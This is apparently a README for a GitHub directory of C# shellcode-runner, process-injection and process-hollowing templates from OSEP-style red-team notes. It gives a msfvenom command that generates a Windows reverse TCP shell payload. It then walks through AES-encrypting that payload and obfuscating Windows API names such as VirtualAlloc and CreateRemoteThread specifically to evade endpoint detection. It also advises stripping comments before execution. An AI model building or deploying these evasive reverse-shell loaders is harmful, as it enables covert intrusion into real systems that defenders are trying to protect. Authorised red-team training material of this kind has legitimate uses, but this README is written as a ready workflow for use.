This directory contains Shellcode execution techniques in C#. 

## 1. Generate Shellcode 
```bash
# Generate shellcode and copy just the shellcode output (0x01, 0x02 etc..)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f powershell
```

## 2. Encrypt shellcode with Invoke-EncyptAES.ps1 
Use the PowerShell script below to encrypt the shellcode
Invoke-EncryptAES.ps1: https://github.com/The-Viper-One/OSEP-Notes/blob/main/Helpers/Invoke-EncryptAES.ps1
```powershell
Invoke-EncryptAES -csharp -bytes "0x02, 0x03, 0x00"
```

## 3. Place the generated payload into any of the templates
Place the Warhead (payload) generated by Invoke-EncryptAES into any of the templates and compile the project.
![image](https://github.com/user-attachments/assets/c54a3bc3-9350-4c5c-bf09-9ef9c058947c)



## 4. Generate new keyword bytes for the template (Optional)

Optionally, we can generate new encryption keys and bytes to obfuscate keywords which may be detected by endpoint detection systems. For example, keywords such as VirtualAlloc and VirtualProtect may raise the overall detection signature of the script. This has already been done in the templates, but would be good practice to generate new keys and bytes everytime.

![image](https://github.com/user-attachments/assets/c9e954e8-152e-4376-b8c1-1ccd5d5793cc)


Additionally is it advised to remove comments from the templates before execution.

## Shellcode Runner templates
Applies to:
- AES_Shellcode_Runner_Dynamic_Invoke.cs
- UUID_Shellcode_Runner_Dynamic_Invoke.cs
```powershell
# Multiple Keys
Invoke-EncryptAES -csharp -MultipleKeys -InputStrings "Kernel32.dll, WaitForSingleObject, VirtualAlloc, CreateThread, VirtualProtect"

# Single Key
Invoke-EncryptAES -csharp -InputStrings "Kernel32.dll, WaitForSingleObject, VirtualAlloc, CreateThread, VirtualProtect"
```
### Shellcode Runner alternate
Applies to:
- AES_Shellcode_Runner_Dynamic_Invoke_Alternative.cs
```powershell
# Multiple Keys
Invoke-EncryptAES -InputStrings "kernel32.dll, HeapCreate, HeapAlloc, HeapFree, EnumSystemGeoID" -MultipleKeys

# Single Key
Invoke-EncryptAES -InputStrings "kernel32.dll, HeapCreate, HeapAlloc, HeapFree, EnumSystemGeoID"
```
### Process Injection
Applies to:
- AES_Process_Injection_Dynamic_Invoke.cs
- UUID_Process_Injection_Dynamic_Invoke.cs
```powershell
# Multiple Keys
Invoke-EncryptAES -csharp -MultipleKeys -InputStrings "Kernel32.dll, OpenProcess, VirtualAllocEx, ReadProcessMemory, WriteProcessMemory, CreateRemoteThread"

# Single Key
Invoke-EncryptAES -csharp -InputStrings "Kernel32.dll, OpenProcess, VirtualAllocEx, ReadProcessMemory, WriteProcessMemory, CreateRemoteThread"
```
### Process Injection Alternative
Applies to:
- AES_Process_Injection_Dynamic_Invoke_Alternate.cs
- UUID_Process_Injection_Dynamic_Invoke_Alternate.cs
```powershell
# Multiple Keys
Invoke-EncryptAES -csharp -MultipleKeys -InputStrings "Kernel32.dll, ntdll.dll, OpenProcess, CreateRemoteThread, ntClose, NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection"

# Single Key
Invoke-EncryptAES -csharp -InputStrings "Kernel32.dll, ntdll.dll, OpenProcess, CreateRemoteThread, ntClose, NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection"
```
### Process Hollowing
Applies to:
- AES_Process_Hollowing_Dynamic_Invoke.cs
- UUID_Process_Hollowing_Dynamic_Invoke.cs
```powershell
# Multiple Keys
Invoke-EncryptAES -csharp -MultipleKeys -InputStrings "Kernel32.dll, ntdll.dll, CreateProcess, ReadProcessMemory, WriteProcessMemory, ResumeThread, ZwQueryInformationProcess"

# Single Key
Invoke-EncryptAES -csharp -InputStrings "Kernel32.dll, ntdll.dll, CreateProcess, ReadProcessMemory, WriteProcessMemory, ResumeThread, ZwQueryInformationProcess"
```
